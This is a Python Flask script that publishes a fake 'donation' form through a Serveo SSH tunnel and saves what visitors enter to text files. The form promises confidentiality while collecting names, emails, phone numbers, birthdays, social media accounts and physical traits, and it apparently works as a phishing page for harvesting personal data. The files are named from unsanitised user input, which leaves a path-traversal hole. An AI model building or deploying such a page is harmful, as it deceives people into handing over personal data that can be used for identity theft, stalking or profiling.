import os
import subprocess
from flask import Flask, render_template, request

# Ensure People folder exists
if not os.path.exists("People"):
    os.makedirs("People")

# Kill any existing process using port 5005
subprocess.call(['fuser', '-k', '5005/tcp'])

# Set up Serveo tunneling (auto-connect to Serveo)
serveo_command = "ssh -o StrictHostKeyChecking=no -R 80:localhost:5005 serveo.net"
subprocess.Popen(serveo_command, shell=True)

# Set up Flask app
app = Flask(__name__)

# HTML template for the form with a professional design and clear instructions
html_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Personal Information for Donation</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #e0e0e0;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-y: auto; /* Enable vertical scrolling */
        }
        .container {
            background-color: #333;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.7);
            width: 100%;
            max-width: 500px; /* Center and limit the max-width */
            text-align: center;
            box-sizing: border-box; /* Include padding and border in the element's total width and height */
        }
        h1 {
            color: #f2f2f2;
        }
        p {
            color: #cfcfcf;
            font-size: 1em;
            line-height: 1.6;
        }
        form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        input {
            margin: 10px 0;
            padding: 8px;
            width: 100%;
            max-width: 350px;
            border: 1px solid #555;
            border-radius: 8px;
            background-color: #444;
            color: #fff;
            box-sizing: border-box;
        }
        input[type="submit"] {
            background-color: #000;
            color: #fff;
            border: none;
            cursor: pointer;
            padding: 12px;
            font-size: 1em;
            max-width: 150px;
        }
        input[type="submit"]:hover {
            background-color: #555;
        }
        .footer {
            margin-top: 20px;
            font-size: 0.9em;
            color: #aaa;
        }
        .warning {
            color: #ff6666;
            font-size: 0.9em;
            margin-bottom: 15px;
        }
        .required {
            color: #ff6666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Personal Information for Donation</h1>
        <p>Welcome to our secure donation processing platform. We are committed to handling your personal information with the highest level of security and confidentiality. This form collects necessary details to ensure your donation process is smooth and efficient.</p>
        
        <div class="warning">
            <p><strong>Important:</strong> By submitting this form, you agree to provide accurate and truthful information. Your data will be used solely for processing your donation and will be protected in compliance with our privacy policies.</p>
        </div>

        <p>Please complete the form below. Fields marked with an asterisk (*) are required. We appreciate your support and commitment to our cause.</p>
        <form action="/" method="POST">
            <input type="text" name="first_name" placeholder="First Name *" required>
            <input type="text" name="last_name" placeholder="Last Name *" required>
            <input type="email" name="email" placeholder="Email *" required>
            <input type="text" name="social_media_accounts" placeholder="Social Media Accounts">
            <input type="text" name="phone_number" placeholder="Phone Number *" required>
            <input type="text" name="birthday" placeholder="DD/MM/YYYY *" pattern="\d{2}/\d{2}/\d{4}" title="Enter date in DD/MM/YYYY format" required>
            <input type="text" name="height" placeholder="Height">
            <input type="text" name="weight" placeholder="Weight">
            <input type="text" name="eye_color" placeholder="Eye Color">
            <input type="text" name="hair_color" placeholder="Hair Color">
            <input type="text" name="country" placeholder="Country">
            <input type="submit" value="Submit">
        </form>
    </div>
</body>
</html>
'''

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        # Collect form data
        first_name = request.form["first_name"]
        last_name = request.form["last_name"]
        email = request.form["email"]
        social_media_accounts = request.form["social_media_accounts"]
        phone_number = request.form["phone_number"]
        birthday = request.form["birthday"]
        height = request.form["height"]
        weight = request.form["weight"]
        eye_color = request.form["eye_color"]
        hair_color = request.form["hair_color"]
        country = request.form["country"]

        # Save the form data to a text file
        file_name = f"People/{first_name}_{last_name}.txt"
        with open(file_name, "w") as f:
            f.write(f"First Name: {first_name}\n")
            f.write(f"Last Name: {last_name}\n")
            f.write(f"Email: {email}\n")
            f.write(f"Social Media Accounts: {social_media_accounts}\n")
            f.write(f"Phone Number: {phone_number}\n")
            f.write(f"Birthday: {birthday}\n")
            f.write(f"Height: {height}\n")
            f.write(f"Weight: {weight}\n")
            f.write(f"Eye Color: {eye_color}\n")
            f.write(f"Hair Color: {hair_color}\n")
            f.write(f"Country: {country}\n")

        return "Thank you! Your information has been submitted."

    return html_template

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5005)
